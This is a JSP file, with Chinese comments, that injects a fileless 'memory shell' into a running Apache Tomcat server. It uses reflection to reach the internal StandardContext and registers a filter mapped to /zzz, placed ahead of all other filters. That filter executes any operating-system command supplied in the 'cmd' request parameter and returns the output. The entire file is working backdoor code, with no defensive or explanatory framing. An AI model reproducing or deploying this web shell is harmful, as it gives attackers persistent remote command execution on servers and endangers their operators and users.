<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import = "org.apache.catalina.Context" %>
<%@ page import = "org.apache.catalina.core.ApplicationContext" %>
<%@ page import = "org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import = "org.apache.catalina.core.StandardContext" %>


<!-- tomcat 8/9 -->
<!-- page import = "org.apache.tomcat.util.descriptor.web.FilterMap"
page import = "org.apache.tomcat.util.descriptor.web.FilterDef" -->


<!-- tomcat 7 -->
<%@ page import = "org.apache.catalina.deploy.FilterMap" %>
<%@ page import = "org.apache.catalina.deploy.FilterDef" %>


<%@ page import = "javax.servlet.*" %>
<%@ page import = "java.io.IOException" %>
<%@ page import = "java.lang.reflect.Constructor" %>
<%@ page import = "java.lang.reflect.Field" %>
<%@ page import = "java.util.Map" %>


<%
class filterDemo implements Filter {
@Override
public void init(FilterConfig filterConfig) throws ServletException {
}
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
String cmd = servletRequest.getParameter("cmd");
if (cmd!= null) {
Process process = Runtime.getRuntime().exec(cmd);
java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
new java.io.InputStreamReader(process.getInputStream()));
StringBuilder stringBuilder = new StringBuilder();
String line;
while ((line = bufferedReader.readLine()) != null) {
stringBuilder.append(line + '\n');
}
servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
servletResponse.getOutputStream().flush();
servletResponse.getOutputStream().close();
return;
}
filterChain.doFilter(servletRequest, servletResponse);
}
@Override
public void destroy() {
}
}
%>
<%
//从org.apache.catalina.core.ApplicationContext反射获取context方法
ServletContext servletContext =  request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
Configs.setAccessible(true);
Map filterConfigs = (Map) Configs.get(standardContext);


String name = "filterDemo";
//判断是否存在filterDemo1这个filter，如果没有则准备创建
if (filterConfigs.get(name) == null){
//定义一些基础属性、类名、filter名等
filterDemo filter = new filterDemo();
FilterDef filterDef = new FilterDef();
filterDef.setFilterName(name);
filterDef.setFilterClass(filter.getClass().getName());
filterDef.setFilter(filter);


//添加filterDef
standardContext.addFilterDef(filterDef);


//创建filterMap，设置filter和url的映射关系,可设置成单一url如/zzz ,也可以所有页面都可触发可设置为/*
FilterMap filterMap = new FilterMap();
// filterMap.addURLPattern("/*");
filterMap.addURLPattern("/zzz");
filterMap.setFilterName(name);
filterMap.setDispatcher(DispatcherType.REQUEST.name());


//添加我们的filterMap到所有filter最前面
standardContext.addFilterMapBefore(filterMap);


//反射创建FilterConfig，传入standardContext与filterDef
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);


//将filter名和配置好的filterConifg传入
filterConfigs.put(name,filterConfig);
out.write("Inject success!");
}
else{
out.write("Injected!");
}
%>